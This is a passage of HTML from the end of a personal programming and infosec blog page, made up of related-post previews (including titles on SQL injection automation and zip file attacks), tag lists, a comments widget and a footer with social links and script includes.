/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1024w.webp 1024w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1800w.webp 1800w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 273" alt="Thumbnail for Automating Boolean-Based SQL Injection with Python" srcset="/img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-256w.webp 256w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-512w.webp 512w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1024w.webp 1024w, /img/posts/infosec/automating-boolean-sqli/assets/automating-boolean-sqli-thumbnail-1800w.webp 1800w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Automating Boolean-Based SQL Injection with Python</h2><div class="post-summary"><p>How to be efficiently lazy at finding hidden gems in predictable places –&nbsp;Database Edition</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/sql/" itemprop="keywords">sql</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/attack-of-the-zip/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/attack-of-the-zip/"><img class="post-img-blurred-bg" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">From Compression to Compromise: Unmasking Zip File Threats</h2><div class="post-summary"><p>Deep dive into zip file attacks and mitigations (with examples!).</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/dynamic-memory-embedded-bad/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/dynamic-memory-embedded-bad/"><img class="post-img-blurred-bg" src="/img/posts/programming/embedded/assets/dynamic-memory-1-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 560" alt="Thumbnail for Why Dynamic Memory Allocation Bad (for Embedded)" srcset="/img/posts/programming/embedded/assets/dynamic-memory-1-256w.webp 256w, /img/posts/programming/embedded/assets/dynamic-memory-1-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/embedded/assets/dynamic-memory-1-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 560" alt="Thumbnail for Why Dynamic Memory Allocation Bad (for Embedded)" srcset="/img/posts/programming/embedded/assets/dynamic-memory-1-256w.webp 256w, /img/posts/programming/embedded/assets/dynamic-memory-1-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Why Dynamic Memory Allocation Bad (for Embedded)</h2><div class="post-summary"><p>If you need flexibility and can afford it, use dynamic memory. If you can’t afford it, use static.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/embedded/" itemprop="keywords">embedded</a> </span><span><a class="jtag" href="/tags/c/" itemprop="keywords">c</a></span></div></div></div></div></article></div></div><hr><h3><i class="fas fa-tags me-2"></i>Related Tags</h3><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to js">software.programming-language</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/cpp/">cpp</a> <a class="jtag" href="/tags/python/">python</a> <a class="jtag" href="/tags/c/">c</a> <a class="jtag" href="/tags/haskell/">haskell</a> <a class="jtag" href="/tags/js/">js</a> <a class="jtag" href="/tags/qt/">qt</a> <a class="jtag" href="/tags/rust/">rust</a> <a class="jtag" href="/tags/qml/">qml</a> <a class="jtag" href="/tags/sql/">sql</a> <a class="jtag" href="/tags/scala/">scala</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to performance, programming, web">software.general</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/programming/">programming</a> <a class="jtag" href="/tags/software-engineering/">software-engineering</a> <a class="jtag" href="/tags/web/">web</a> <a class="jtag" href="/tags/aoc/">aoc</a> <a class="jtag" href="/tags/apps/">apps</a> <a class="jtag" href="/tags/dsp/">dsp</a> <a class="jtag" href="/tags/programming-languages/">programming-languages</a> <a class="jtag" href="/tags/linux/">linux</a> <a class="jtag" href="/tags/performance/">performance</a> <a class="jtag" href="/tags/functional/">functional</a> <a class="jtag" href="/tags/types/">types</a> <a class="jtag" href="/tags/windows/">windows</a> <a class="jtag" href="/tags/ai/">ai</a> <a class="jtag" href="/tags/metaprogramming/">metaprogramming</a> <a class="jtag" href="/tags/oop/">oop</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to meta, tutorial">misc</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/writeup/">writeup</a> <a class="jtag" href="/tags/notes/">notes</a> <a class="jtag" href="/tags/tutorial/">tutorial</a> <a class="jtag" href="/tags/reflection/">reflection</a> <a class="jtag" href="/tags/hkust/">hkust</a> <a class="jtag" href="/tags/project/">project</a> <a class="jtag" href="/tags/experience/">experience</a> <a class="jtag" href="/tags/faith/">faith</a> <a class="jtag" href="/tags/meta/">meta</a> <a class="jtag" href="/tags/learning/">learning</a> <a class="jtag" href="/tags/mathematics/">mathematics</a> <a class="jtag" href="/tags/cheatsheet/">cheatsheet</a> <a class="jtag" href="/tags/research/">research</a> <a class="jtag" href="/tags/satire/">satire</a> <a class="jtag" href="/tags/essay/">essay</a> <a class="jtag" href="/tags/reading/">reading</a></span></div></div><hr class="section-sep"><div class="container-md mt-4 p-4"><a id="comments"></a><p><em>Comments are back! Privacy-focused, without ads, bloatware 🤮, and trackers. Be one of the first to contribute to the discussion — I'd love to hear your thoughts.</em></p><script defer src="https://trebledj.me/js/comentario.min.js"></script><comentario-comments id="comentario" auto-init="false" no-fonts="true" css-override="false" theme="dark"></comentario-comments></div><br></div></div></article></div></div></div><footer class="d-flex flex-column gap-2"><div class="d-flex flex-row gap-3 mx-auto" style="width:fit-content;"><a rel="me noreferrer" href="https://github.com/TrebledJ" target="_blank"><i class="social-icon fab fa-github" style="color:rgb(150, 60, 180) !important;"></i> </a><a rel="me noreferrer" href="https://stackoverflow.com/users/10239789/trebledj" target="_blank"><i class="social-icon fab fa-stack-overflow" style="color:rgb(236, 124, 34) !important;"></i> </a><a rel="me noreferrer" href="https://www.codingame.com/profile/8444100ecb9723c1ec542346b0630aaa2821532" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/codingame.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://soundcloud.com/trebledj" target="_blank"><i class="social-icon fab fa-soundcloud" style="color:rgb(237, 110, 30) !important;"></i> </a><a rel="me noreferrer" href="https://musescore.com/user/20636901" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/musescore.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://discordapp.com/users/220427982798454794" target="_blank"><i class="social-icon fab fa-discord" style="color:rgb(84, 100, 235) !important;"></i> </a><a rel="me" href="mailto:trebledjjj@gmail.com"><i class="social-icon fas fa-envelope"></i> </a><a rel="me" href="/feeds"><i class="social-icon fas fa-square-rss"></i></a></div><p>Copyright&nbsp;©&nbsp;2025&nbsp;TrebledJ • <a href="/privacy-policy">Privacy&nbsp;Policy</a> • <a href="https://github.com/TrebledJ/trebledj.github.io?tab=readme-ov-file#credits--appreciation" rel="noreferrer" target="_blank">Credits</a></p></footer><script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js"></script><script>var tocOptions={}</script><script defer src="/cb/MPnrKnjI5w.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;52d99b3d385b4c9a98ac8ad109a95a2a&quot;}"></script></body></html>